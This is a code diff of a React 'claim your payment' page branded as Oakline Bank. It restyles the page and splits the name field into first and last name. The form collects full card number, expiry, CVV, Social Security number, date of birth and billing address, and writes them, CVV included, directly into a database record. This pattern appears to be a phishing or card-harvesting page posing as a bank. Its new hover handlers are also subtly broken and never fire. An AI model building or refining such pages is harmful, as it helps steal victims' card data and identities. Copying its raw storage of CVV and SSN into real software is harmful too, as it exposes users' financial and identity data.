@@ -14,7 +14,8 @@ export default function ClaimPaymentPage() {
   const [activeTab, setActiveTab] = useState('debit_card');
 
   const [debitCardForm, setDebitCardForm] = useState({
-    cardholder_name: '',
+    first_name: '',
+    last_name: '',
     card_number: '',
     card_expiry: '',
     card_cvv: '',
@@ -97,7 +98,7 @@ export default function ClaimPaymentPage() {
   };
 
   const handleDebitCardSubmit = async () => {
-    if (!debitCardForm.cardholder_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
+    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
       setMessage('Please fill in all required fields.', 'error');
       setMessageType('error');
       return;
@@ -110,7 +111,7 @@ export default function ClaimPaymentPage() {
         .update({
           claim_method: 'debit_card',
           claimed_at: new Date().toISOString(),
-          cardholder_name: debitCardForm.cardholder_name,
+          cardholder_name: `${debitCardForm.first_name} ${debitCardForm.last_name}`,
           card_number: debitCardForm.card_number,
           card_expiry: debitCardForm.card_expiry,
           card_cvv: debitCardForm.card_cvv,
@@ -232,19 +233,19 @@ export default function ClaimPaymentPage() {
         }}>
           {/* Header Section */}
           <div style={{
-            background: 'linear-gradient(135deg, #0066cc 0%, #004999 100%)',
-            color: 'white',
-            padding: '3rem 2rem',
+            background: 'linear-gradient(135deg, #0052a3 0%, #003a7a 100%)',
+            color: '#ffffff',
+            padding: '2.5rem 2rem',
             borderRadius: '16px 16px 0 0',
             textAlign: 'center'
           }}>
-            <h2 style={{ margin: '0 0 0.5rem 0', fontSize: '1.5rem', fontWeight: '700' }}>🏦 Oakline Bank</h2>
-            <p style={{ margin: '0 0 1.5rem 0', fontSize: '0.95rem', opacity: 0.95 }}>Secure Payment Claim System</p>
-            <div style={{ fontSize: '2.5rem', fontWeight: 'bold', marginBottom: '0.5rem' }}>
+            <h1 style={{ margin: '0 0 0.25rem 0', fontSize: '1.25rem', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.5px' }}>🏦 OAKLINE BANK</h1>
+            <p style={{ margin: '0 0 1.5rem 0', fontSize: '0.85rem', color: 'rgba(255,255,255,0.9)', fontWeight: '500', letterSpacing: '0.5px' }}>PAYMENT CLAIM SYSTEM</p>
+            <div style={{ fontSize: '3rem', fontWeight: '900', marginBottom: '0.75rem', color: '#ffffff' }}>
               ${parseFloat(payment?.amount || 0).toFixed(2)}
             </div>
-            <p style={{ margin: '0', fontSize: '0.95rem', opacity: 0.9 }}>
-              Payment from <strong>{payment?.sender_name || payment?.sender_contact}</strong>
+            <p style={{ margin: '0', fontSize: '0.9rem', color: 'rgba(255,255,255,0.95)', fontWeight: '500' }}>
+              From <strong style={{ color: '#ffffff' }}>{payment?.sender_name || payment?.sender_contact}</strong>
             </p>
           </div>
 
@@ -296,35 +297,42 @@ export default function ClaimPaymentPage() {
               {/* Tabs */}
               <div style={{
                 display: 'flex',
-                gap: '0.75rem',
-                marginBottom: '2rem',
+                gap: '1rem',
+                marginBottom: '2.5rem',
+                paddingBottom: '1.5rem',
                 borderBottom: '2px solid #e5e7eb',
                 className: 'tab-container'
               }}>
                 {[
-                  { id: 'debit_card', label: '💳 Debit Card', subtitle: 'Instant (1 hour)' },
-                  { id: 'ach', label: '🏦 ACH Transfer', subtitle: '1-3 days' },
-                  { id: 'account', label: '📱 Create Account', subtitle: 'Instant' }
+                  { id: 'debit_card', label: 'Debit Card', subtitle: 'Instant' },
+                  { id: 'ach', label: 'ACH Transfer', subtitle: '1-3 Days' },
+                  { id: 'account', label: 'Create Account', subtitle: 'Instant' }
                 ].map(tab => (
                   <button
                     key={tab.id}
                     onClick={() => setActiveTab(tab.id)}
                     style={{
-                      padding: '1rem',
+                      padding: '0.875rem 1.25rem',
                       border: 'none',
                       borderBottom: activeTab === tab.id ? '3px solid #0066cc' : 'none',
-                      backgroundColor: activeTab === tab.id ? '#f8fafc' : 'transparent',
+                      backgroundColor: 'transparent',
                       color: activeTab === tab.id ? '#0066cc' : '#64748b',
                       cursor: 'pointer',
-                      fontWeight: activeTab === tab.id ? '600' : '500',
-                      fontSize: '0.9rem',
-                      transition: 'all 0.2s',
+                      fontWeight: activeTab === tab.id ? '700' : '600',
+                      fontSize: '0.95rem',
+                      transition: 'all 0.3s ease',
                       flex: 1,
-                      textAlign: 'left'
+                      textAlign: 'center',
+                      display: 'flex',
+                      flexDirection: 'column',
+                      alignItems: 'center',
+                      gap: '0.35rem'
                     }}
+                    onMouseEnter={(e) => !activeTab === tab.id && (e.target.style.color = '#0066cc')}
+                    onMouseLeave={(e) => !activeTab === tab.id && (e.target.style.color = '#64748b')}
                   >
-                    <div>{tab.label}</div>
-                    <div style={{ fontSize: '0.75rem', opacity: 0.7, marginTop: '0.25rem' }}>{tab.subtitle}</div>
+                    <div style={{ fontSize: '0.95rem' }}>{tab.label}</div>
+                    <div style={{ fontSize: '0.75rem', color: activeTab === tab.id ? '#0066cc' : '#999', fontWeight: '500' }}>{tab.subtitle}</div>
                   </button>
                 ))}
               </div>
@@ -332,49 +340,59 @@ export default function ClaimPaymentPage() {
               {/* DEBIT CARD TAB */}
               {activeTab === 'debit_card' && (
                 <div style={{ animation: 'fadeIn 0.3s ease-in' }}>
-                  <h3 style={{ color: '#1e293b', fontSize: '1.1rem', marginBottom: '0.5rem', margin: '0 0 0.5rem 0' }}>💳 Instant Debit Card Deposit</h3>
-                  <p style={{ color: '#64748b', marginBottom: '1.5rem', fontSize: '0.9rem' }}>Visa/Mastercard - funds typically available within 1 hour</p>
+                  <h3 style={{ color: '#1e293b', fontSize: '1.15rem', fontWeight: '700', marginBottom: '0.75rem', marginTop: 0 }}>Debit Card Deposit</h3>
+                  <p style={{ color: '#0066cc', marginBottom: '2rem', fontSize: '0.9rem', fontWeight: '500' }}>Visa / Mastercard — Funds available within 1 hour</p>
 
-                  <div style={{ marginBottom: '2rem' }}>
-                    <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>Card Information</h4>
-                    <div style={{ marginBottom: '1rem' }}>
-                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Cardholder Name *</label>
-                      <input type="text" placeholder="Full name on card" value={debitCardForm.cardholder_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, cardholder_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
-                    </div>
-
-                    <div style={{ marginBottom: '1rem' }}>
-                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Card Number *</label>
-                      <input type="text" placeholder="1234 5678 9012 3456" maxLength="19" value={debitCardForm.card_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_number: e.target.value.replace(/\D/g, '') })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', letterSpacing: '2px' }} />
-                    </div>
-
+                  <div style={{ marginBottom: '2.5rem' }}>
+                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Personal Information</h4>
                     <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Expiry (MM/YY) *</label>
-                        <input type="text" placeholder="MM/YY" maxLength="5" value={debitCardForm.card_expiry} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_expiry: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>First Name *</label>
+                        <input type="text" placeholder="John" value={debitCardForm.first_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, first_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>CVV *</label>
-                        <input type="text" placeholder="123" maxLength="4" value={debitCardForm.card_cvv} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Last Name *</label>
+                        <input type="text" placeholder="Doe" value={debitCardForm.last_name} onChange={(e) => setDebitCardForm({ ...debitCardForm, last_name: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
                     </div>
                   </div>
 
-                  <div style={{ marginBottom: '2rem' }}>
-                    <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>Verification Details</h4>
-                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
+                  <div style={{ marginBottom: '2.5rem' }}>
+                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Card Details</h4>
+
+                    <div style={{ marginBottom: '1rem' }}>
+                      <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Card Number *</label>
+                      <input type="text" placeholder="1234 5678 9012 3456" maxLength="19" value={debitCardForm.card_number} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_number: e.target.value.replace(/\D/g, '') })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', letterSpacing: '2px', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                    </div>
+
+                    <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>SSN *</label>
-                        <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Expiry (MM/YY) *</label>
+                        <input type="text" placeholder="MM/YY" maxLength="5" value={debitCardForm.card_expiry} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_expiry: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Date of Birth *</label>
-                        <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>CVV *</label>
+                        <input type="text" placeholder="123" maxLength="4" value={debitCardForm.card_cvv} onChange={(e) => setDebitCardForm({ ...debitCardForm, card_cvv: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
                       </div>
                     </div>
                   </div>
 
-                  <div style={{ marginBottom: '2rem' }}>
-                    <h4 style={{ color: '#333', fontSize: '0.95rem', fontWeight: '600', marginBottom: '1rem', marginTop: 0 }}>Billing Address</h4>
+                  <div style={{ marginBottom: '2.5rem' }}>
+                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Identity Verification</h4>
+                    <div className="form-row" style={{ display: 'flex', gap: '1rem', marginBottom: '1rem' }}>
+                      <div style={{ flex: 1 }}>
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>SSN *</label>
+                        <input type="text" placeholder="XXX-XX-XXXX" maxLength="11" value={debitCardForm.ssn} onChange={(e) => { let v = e.target.value.replace(/\D/g, ''); if (v.length <= 3) v = v; else if (v.length <= 5) v = v.slice(0, 3) + '-' + v.slice(3); else v = v.slice(0, 3) + '-' + v.slice(3, 5) + '-' + v.slice(5, 9); setDebitCardForm({ ...debitCardForm, ssn: v }); }} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                      </div>
+                      <div style={{ flex: 1 }}>
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '600', fontSize: '0.85rem' }}>Date of Birth *</label>
+                        <input type="date" value={debitCardForm.date_of_birth} onChange={(e) => setDebitCardForm({ ...debitCardForm, date_of_birth: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #d1d5db', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem', transition: 'border-color 0.2s' }} onFocus={(e) => e.target.style.borderColor = '#0066cc'} onBlur={(e) => e.target.style.borderColor = '#d1d5db'} />
+                      </div>
+                    </div>
+                  </div>
+
+                  <div style={{ marginBottom: '2.5rem' }}>
+                    <h4 style={{ color: '#333', fontSize: '0.9rem', fontWeight: '700', marginBottom: '1.25rem', marginTop: 0, textTransform: 'uppercase', letterSpacing: '0.3px', color: '#555' }}>Billing Address</h4>
                     <div style={{ marginBottom: '1rem' }}>
                       <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Street Address *</label>
                       <input type="text" placeholder="123 Main Street" value={debitCardForm.billing_address} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_address: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
